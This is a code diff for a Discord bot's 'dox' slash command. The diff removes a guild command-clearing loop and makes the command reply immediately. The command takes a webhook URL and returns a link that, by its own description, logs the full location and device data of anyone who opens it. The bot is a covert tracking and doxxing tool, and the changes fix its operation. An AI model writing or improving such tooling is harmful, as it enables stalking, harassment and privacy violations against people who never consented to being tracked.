@@ -50,16 +50,6 @@ client.once('ready', async () => {
         await client.application.commands.set([]);
         console.log('✅ Cleared all global commands');
         
-        const guilds = await client.guilds.fetch();
-        for (const [id, guild] of guilds) {
-            try {
-                await guild.commands.set([]);
-                console.log(`✅ Cleared commands in guild: ${guild.name}`);
-            } catch (err) {
-                console.log(`❌ Could not clear commands in guild: ${guild.name}`);
-            }
-        }
-        
         await client.application.commands.set([
             { 
                 name: 'dox', 
@@ -83,10 +73,12 @@ client.once('ready', async () => {
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
-    // ---- DOX ----
+    // ---- DOX (FIXED — replies instantly) ----
     if (interaction.commandName === 'dox') {
+        // IMMEDIATELY acknowledge the command
         await interaction.deferReply({ ephemeral: true });
 
+        // Now do the work
         const customWebhook = interaction.options.getString('webhook');
         if (!customWebhook || !customWebhook.startsWith('https://discord.com/api/webhooks/')) {
             return interaction.editReply('❌ Please provide a valid Discord webhook URL.');
@@ -110,6 +102,7 @@ client.on('interactionCreate', async (interaction) => {
             .setDescription(`🔗 **${url}**\n\nSend this link to anyone. When they open it, their full location and device data will be logged.`)
             .setFooter({ text: 'Expires after 100 links generated' });
 
+        // Now edit the reply with the actual content
         await interaction.editReply({ embeds: [embed] });
     }
 });
